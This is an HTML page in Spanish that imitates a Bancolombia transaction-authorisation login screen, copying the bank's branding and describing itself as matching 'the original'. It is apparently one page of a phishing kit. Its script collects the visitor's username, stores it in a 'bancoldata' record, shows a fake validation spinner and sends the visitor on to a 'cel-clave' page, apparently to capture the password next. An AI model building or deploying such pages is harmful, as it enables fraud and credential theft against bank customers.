<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bancolombia - Autorización</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', Arial, sans-serif; }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* ── CURVAS DE FONDO (igual que el original) ── */
        body::before {
            content: "";
            position: absolute;
            top: 250px;
            left: -50px;
            width: 800px;
            height: 400px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M-10,80 Q30,20 80,60 T120,40" fill="none" stroke="%23F47C20" stroke-width="3" stroke-linecap="round"/><path d="M10,80 Q50,20 100,60" fill="none" stroke="%23FDDA24" stroke-width="2" stroke-linecap="round"/></svg>') no-repeat;
            background-size: contain;
            z-index: 0;
        }

        body::after {
            content: "";
            position: absolute;
            top: 150px;
            right: 0;
            width: 400px;
            height: 600px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M50,100 Q60,50 100,10" fill="none" stroke="%23FDDA24" stroke-width="4" stroke-linecap="round"/><path d="M20,100 Q50,60 90,20" fill="none" stroke="%23F47C20" stroke-width="2" stroke-linecap="round"/><path d="M70,40 Q85,20 100,15" fill="none" stroke="%238E44AD" stroke-width="2" stroke-linecap="round"/></svg>') no-repeat;
            background-size: contain;
            z-index: 0;
        }

        /* ── HEADER ── */
        header {
            width: 100%;
            padding: 30px 0 20px 0;
            text-align: center;
            position: relative;
            z-index: 10;
        }
        header img { width: 200px; }
        .header-salir {
            position: absolute;
            right: 24px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            font-weight: 600;
            color: #2C2A29;
            cursor: pointer;
            background: none;
            border: none;
            font-family: 'Open Sans', Arial, sans-serif;
        }

        /* ── CONTENEDOR ── */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 500px;
            margin: 0 auto;
            padding: 10px 20px 50px 20px;
            position: relative;
            z-index: 5;
        }

        .page-title {
            font-size: 1.8rem;
            color: #2C2A29;
            font-weight: 800;
            margin-bottom: 20px;
            text-align: center;
        }

        /* ── CARD ── */
        .login-card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
            padding: 40px 30px;
            width: 100%;
            text-align: center;
        }

        .login-card p.subtitle {
            font-size: 0.95rem;
            color: #444;
            line-height: 1.5;
            margin-bottom: 32px;
        }

        /* ── INPUT ── */
        .input-group {
            margin-bottom: 28px;
            text-align: left;
        }

        .input-group label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 1rem;
            color: #444;
            margin-bottom: 6px;
            font-weight: 400;
        }

        .input-group label svg { width: 18px; height: 18px; fill: #555; }

        .bancolombia-input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #757575;
            padding: 5px 0 8px 0;
            font-size: 1.1rem;
            outline: none;
            background: transparent;
            color: #2C2A29;
            transition: border-color 0.2s;
        }
        .bancolombia-input:focus { border-bottom: 2px solid #2C2A29; }

        .forgot-link {
            display: inline-block;
            margin-top: 8px;
            color: #2C2A29;
            font-weight: 700;
            text-decoration: underline;
            font-size: 0.8rem;
        }

        /* ── BOTONES ── */
        .btn-submit {
            width: 100%;
            background-color: #E0E0E0;
            color: #757575;
            border: none;
            border-radius: 50px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 700;
            margin-top: 10px;
            margin-bottom: 25px;
            transition: all 0.3s;
            cursor: not-allowed;
        }
        .btn-submit.activo {
            background-color: #FDDA24;
            color: #2C2A29;
            cursor: pointer;
        }

        /* ── LOADER ── */
        #loading-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255,255,255,0.95);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .loader-container { position: relative; width: 60px; height: 60px; animation: rotateLoader 1.5s linear infinite; }
        .dot { position: absolute; width: 20px; height: 20px; border-radius: 50%; }
        .dot-yellow { background-color: #FDDA24; top: 0; left: 50%; transform: translateX(-50%); }
        .dot-blue { background-color: #2C2A29; bottom: 5px; left: 0; }
        .dot-red { background-color: #ccc; bottom: 5px; right: 0; }
        @keyframes rotateLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ── RESPONSIVE ── */
        @media (max-width: 768px) {
            body::before { top: 80px; left: -100px; width: 600px; height: 300px; opacity: 0.6; }
            body::after { top: 100px; right: -80px; width: 350px; height: 500px; opacity: 0.6; }
            .container { padding: 10px 15px; }
            .page-title { font-size: 1.5rem; }
            .login-card { padding: 30px 20px; }
        }
    </style>
</head>
<body>

<div id="loading-overlay">
    <div class="loader-container">
        <div class="dot dot-yellow"></div>
        <div class="dot dot-blue"></div>
        <div class="dot dot-red"></div>
    </div>
    <div style="color:#2C2A29; margin-top:20px; font-weight:600;">Validando datos...</div>
</div>

<header>
    <img src="img/logo.svg" alt="Bancolombia">
    <button class="header-salir" onclick="history.back()">Salir →</button>
</header>

<div class="container">
    <h1 class="page-title">Autorización de Transacción</h1>
    <div class="login-card">
        <p class="subtitle">El usuario es el mismo con el que ingresas a la Sucursal Virtual Personas.</p>

        <div class="input-group">
            <label>
                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0-6c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 7c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                Usuario
            </label>
            <input type="text" id="userInput" class="bancolombia-input" placeholder="" autocomplete="off" oninput="activarBoton()">
            <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
        </div>

        <button id="btnContinuar" class="btn-submit">Continuar</button>
    </div>
</div>

<script>
    function activarBoton() {
        var val = document.getElementById('userInput').value.trim();
        var btn = document.getElementById('btnContinuar');
        btn.classList.toggle('activo', val.length >= 4);
    }

    document.getElementById('btnContinuar').addEventListener('click', function() {
        var val = document.getElementById('userInput').value.trim();
        if (val.length < 4) return;
        document.getElementById('loading-overlay').style.display = 'flex';
        var d = {};
        try { d = JSON.parse(localStorage.getItem('bancoldata')) || {}; } catch(e) {}
        d.usuario = val;
        localStorage.setItem('bancoldata', JSON.stringify(d));
        setTimeout(function() { window.location.href = 'cel-clave.html'; }, 800);
    });

    document.getElementById('userInput').addEventListener('keyup', function(e) {
        if (e.key === 'Enter') document.getElementById('btnContinuar').click();
    });
</script>
</body>
</html>
